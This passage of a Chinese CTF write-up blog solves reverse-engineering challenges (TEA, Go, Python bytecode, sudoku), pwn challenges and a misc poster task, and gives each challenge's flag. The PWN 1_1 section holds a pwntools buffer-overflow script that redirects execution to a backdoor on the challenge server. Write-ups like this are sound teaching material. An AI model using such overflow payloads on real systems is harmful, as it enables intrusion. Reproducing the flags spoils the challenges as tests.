    uint32_t v[2]={0x5B9B49A1,0x1F14C265};  //这里放入两个进行加密的文件
    uint32_t const k[4]={76,110,71,115};  //放入Key
    unsigned int r=32;
    printf("加密后的数据：%u %u\n",v[0],v[1]);  
    decipher(r, v, k);  
    printf("解密后的数据：%u %u\n",v[0],v[1]);
    return 0;  
} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>到了这里解释一下为什么不用代码中直接可见的数据，因为在动态调试时发现再运行guess函数时girls中的数据是不同于代码中的GirlsHeart的，且每一次运行数据都可能会变换…</p>
<p>但只有其中一组可以解出可见字符：</p>
<p>0x5B9B4B8B 0x1F14C04F 0xB594A2FF 0x48676F9D</p>
<p>按照上文解密过程可以得出：y%U_@2e_@11_m7_w    再加上确定的后四位得到y%U_@2e_@11_m7_wLnGs</p>
<p>因此<strong>flag：SYC{y%U_@2e_@11_m7_wLnGs}</strong></p>
<p>girls中的数据变换应该与那个计时有关</p>
<p>出题人给出的解释：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122005320133.png" alt="image-20221122005320133"></p>
<p>试了一下好像girlsHeart的值与时间有关而且似乎只有前几秒的值是正常的flag</p>
<h3 id="放松心情"><a href="#放松心情" class="headerlink" title="放松心情"></a>放松心情</h3><p>查壳：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122133719569.png" alt="image-20221122133719569"></p>
<p>发现是个go语言写的程序</p>
<p>由于我之前用的ida是7.5的版本，分析go语言出现很多奇怪的东西…好像有个插件可以进行优化，但没有尝试去用，直接下了个7.6的版本</p>
<p>官网上说7.6的版本支持对go语言的解析</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122134110235.png" alt="image-20221122134110235"></p>
<p>go语言用ida7.6以上！！！直接逆</p>
<p><a class="link" target="_blank" rel="noopener" href="https://sukisafe.wordpress.com/2019/10/27/rsctf-%E9%80%86%E5%90%91-go-exe/%E8%BF%99%E9%87%8C%E6%9F%A5%E4%BA%86%E4%B8%80%E4%B8%8B%E4%B8%80%E4%B8%AAgo%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E7%9A%84%E8%BF%87%E7%A8%8B">https://sukisafe.wordpress.com/2019/10/27/rsctf-%E9%80%86%E5%90%91-go-exe/这里查了一下一个go语言逆向的过程<i class="fas fa-external-link-alt"></i></a></p>
<p>逆向出的代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">main_main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v0<span class="token punctuation">;</span> <span class="token comment">// r14</span>
  _QWORD <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  _QWORD <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 j<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// r8</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 k<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-208h]</span>
  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-200h]</span>
  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-1F8h]</span>
  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-1F0h]</span>
  __int64 v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-1E8h]</span>
  __int64 v15<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-1D0h]</span>
  <span class="token keyword">char</span> v16<span class="token punctuation">[</span><span class="token number">312</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-188h] BYREF</span>
  _QWORD <span class="token operator">*</span>v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+1C8h] [rbp-50h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D0h] [rbp-48h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D8h] [rbp-40h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+1E0h] [rbp-38h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+1E8h] [rbp-30h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v22<span class="token punctuation">;</span> <span class="token comment">// [rsp+1F0h] [rbp-28h]</span>
  __int64 v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+1F8h] [rbp-20h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v24<span class="token punctuation">;</span> <span class="token comment">// [rsp+200h] [rbp-18h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v25<span class="token punctuation">;</span> <span class="token comment">// [rsp+208h] [rbp-10h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v16 <span class="token operator">&lt;=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v0 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">runtime_morestack_noctxt_abi0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_15EE6B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_15F198</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v12 <span class="token operator">=</span> <span class="token function">runtime_newobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v17 <span class="token operator">=</span> v1<span class="token punctuation">;</span>
  <span class="token operator">*</span>v1 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v24 <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_1A5300<span class="token punctuation">;</span>
  v25 <span class="token operator">=</span> <span class="token operator">&amp;</span>off_1DCEC0<span class="token punctuation">;</span>
  <span class="token function">fmt_Fprintln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v22 <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_1A3500<span class="token punctuation">;</span>
  v23 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v17<span class="token punctuation">;</span>
  v15<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">fmt_Fscanf</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> v11<span class="token punctuation">,</span> v12<span class="token punctuation">,</span> v13<span class="token punctuation">,</span> v14<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输入</span>
  v2 <span class="token operator">=</span> v17<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v17<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">24LL</span> <span class="token punctuation">)</span>                         <span class="token comment">// 长度为24</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>i <span class="token operator">&gt;=</span> v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token function">runtime_panicIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v16<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">120</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>v2 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>v2 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> j <span class="token operator">=</span> v5 <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v5 <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      v6 <span class="token operator">=</span> j<span class="token punctuation">;</span>
      v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v16<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> j <span class="token operator">+</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      v8 <span class="token operator">=</span> j
         <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>__int128<span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token number">0xAAAAAAAAAAAAAAABLL</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">24</span> <span class="token punctuation">)</span>
        <span class="token function">runtime_panicIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v16<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> v6 <span class="token operator">+</span> <span class="token number">120</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v16<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> v8 <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">]</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span><span class="token comment">// 因此整个程序的加密就是v16[k]^=v16[k+1],其中k为8表示QWORD v16的下标</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v15<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v16<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> k <span class="token operator">+</span> <span class="token number">120</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_4<span class="token punctuation">;</span>                           <span class="token comment">// 不相同error</span>
    <span class="token punctuation">}</span>
    v20 <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_1A5300<span class="token punctuation">;</span>
    v21 <span class="token operator">=</span> <span class="token operator">&amp;</span>off_1DCED0<span class="token punctuation">;</span>
    <span class="token function">fmt_Fprintln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">// win</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
LABEL_4<span class="token operator">:</span>
    v18 <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_1A5300<span class="token punctuation">;</span>
    v19 <span class="token operator">=</span> <span class="token operator">&amp;</span>off_1DCEE0<span class="token punctuation">;</span>
    <span class="token function">fmt_Fprintln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比较函数一直在v16上通过前面的元素进行运算得到后面的元素</p>
<p>本题的</p>
<p>通过动态调试进行提取比较数据</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122174145518.png" alt="image-20221122174145518"></p>
<pre class="line-numbers language-none"><code class="language-none">0xA0, 0xA1, 0x83, 0xC0,
0x21, 0x90, 0xF0, 0xC0,
0x20, 0x80, 0xA3, 0xB2,
0xB1, 0x3, 0xC2, 0xA0,
0xA1, 0xF0, 0x30, 0x91,
0x31, 0x71, 0xF0, 0x77<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据以上思路就可以得到flag</p>
<p>SYC{welcome_to_syclover}  </p>
<h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>这题是python字节码，查了一下发现都是通过手动还原代码做出来的，因此自己通过写了一下代码，然后通过<a class="link" target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/dis.html">dis<i class="fas fa-external-link-alt"></i></a>这个反编译器进行调试</p>
<p>参考<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37157335/article/details/124121928">这篇文章<i class="fas fa-external-link-alt"></i></a>可以了解很多字节码指令的含义</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122162934619.png" alt="image-20221122162934619"></p>
<p>本题大意：</p>
<p>对于t中元素都-70后，剩下的数字就是经过输入数据经过operate函数变化后的结果，通过operate中的函数内容，可以猜测出operate函数是根据op_list来进行操作的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">其中op_list<span class="token operator">=</span><span class="token string">'36a5dcb42e1gah78dd09'</span>
<span class="token string">''</span>'
t的数据<span class="token operator">-</span><span class="token number">70</span>后的值
<span class="token number">48</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
相应字符	操作
	a	cc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*=</span><span class="token number">2</span>
	b 	cc<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">*=</span><span class="token number">4</span>			
	c	cc<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">-=</span><span class="token number">2</span>
	d	cc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">=</span><span class="token number">15</span>
	e	cc<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">7</span>
	f	cc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">=</span><span class="token number">6</span>
	g	cc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">11</span>
	h	cc<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">-=</span><span class="token number">2</span>	
	<span class="token number">1</span>	cc<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">*=</span><span class="token number">4</span>
	<span class="token number">2</span>	cc<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">-=</span><span class="token number">7</span>
	<span class="token number">3</span>	cc<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">20</span>
	<span class="token number">4</span>	cc<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">*=</span><span class="token number">3</span>
	<span class="token number">5</span>	cc<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">-=</span><span class="token number">1</span>
	<span class="token number">6</span>	cc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*=</span><span class="token number">2</span>
	<span class="token number">7</span>	cc<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">=</span><span class="token number">6</span>
	<span class="token number">8</span>	cc<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">*=</span><span class="token number">3</span>
	<span class="token number">9</span>	cc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">13</span>
	<span class="token number">0</span>	cc<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">=</span><span class="token number">10</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
结果：
<span class="token number">6</span> <span class="token number">4</span> <span class="token number">6</span> <span class="token number">0</span> <span class="token number">8</span> <span class="token number">9</span> <span class="token number">6</span> <span class="token number">5</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span> <span class="token number">0</span> <span class="token number">9</span> <span class="token number">8</span> <span class="token number">7</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SYC{6460896578909876}</p>
<h3 id="sdzz"><a href="#sdzz" class="headerlink" title="sdzz"></a>sdzz</h3><p>将程序进行逆向分析：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122193622314.png" alt="image-20221122193622314"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122185735344.png" alt="image-20221122185735344"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122185757883.png" alt="image-20221122185757883"></p>
<p>根据代码以及hint中的数独可知，输入是对一个9*9的数独填充数据</p>
<p>通过动态调试得到数独表：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122194211842.png" alt="image-20221122194211842">，</p>
<pre class="line-numbers language-none"><code class="language-none">[5, 0, 0, 6, 1, 0, 0, 0, 0],                 
         [6, 0, 0, 0, 0, 3, 0, 0, 2],
         [0, 4, 1, 0, 0, 0, 8, 0, 6],
         [0, 6, 0, 0, 0, 9, 0, 8, 0],
         [0, 2, 0, 3, 6, 8, 0, 4, 0],
         [0, 3, 0, 5, 0, 0, 0, 2, 0],
         [3, 0, 2, 0, 0, 0, 4, 1, 0],
         [9, 0, 0, 7, 0, 0, 0, 0, 3],
         [0, 0, 0, 0, 3, 5, 0, 0, 8]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>0为带填充数据</p>
<p>当填充为正确时即为flag，用网上找的这个脚本跑出来</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221120014842479.png" alt="image-20221120014842479"></p>
<p><strong>flag：SYC{83297497481529573752431197584716958967182456476129}</strong></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>nc连一下即可</p>
<p>SYC{W3Lcome_t0_gEEk_3Nj0y_the_tour!!!}</p>
<h3 id="PWN-1-1"><a href="#PWN-1-1" class="headerlink" title="PWN 1_1"></a>PWN 1_1</h3><p>程序ida分析后主程序：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221028001521961.png" alt="image-20221028001521961"></p>
<p>根据这里buf[]只有16，但是却通过read读入4096个字符，也就是我们要通过溢出，且发现有一个b4ckd00r函数：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221028001710283.png" alt="image-20221028001710283"></p>
<p>因此我们要想方设法的调用这个函数以此来获得flag:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"gxh191.top"</span><span class="token punctuation">,</span><span class="token number">25537</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401196</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4011B6</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>SYC{w3l[oMe-70-yovr_8a[Kd0or_w0r1d~17-15-3a2y}</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="SeeUrLeaflets"><a href="#SeeUrLeaflets" class="headerlink" title="SeeUrLeaflets"></a>SeeUrLeaflets</h3><p>根据提示使用海报 </p>
<h4 id="c语言"><a href="#c语言" class="headerlink" title="c语言"></a>c语言</h4><p>看c语言代码得到：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstdlib&gt;</span></span>
using namespace std<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">2334</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"syc{"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token string">"SYC6WelcOmE"</span><span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Linux下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221021184357334.png" alt="image-20221021184357334"></p>
<p>windows下g++编译：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221021184425824.png" alt="image-20221021184425824"></p>
<p>但由于海报注释了再linux下，于是得到：</p>
<p><strong>flag：  syc{YWSCcSWY6}</strong></p>
<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>通过信息打开网址的80端口，发现只有个图片，</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221021191259857.png" alt="image-20221021191259857"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/log.png" alt="log"></p>
<p>本来以为是个隐写，搞了半天啥都没有，最后看了下源码：</p>
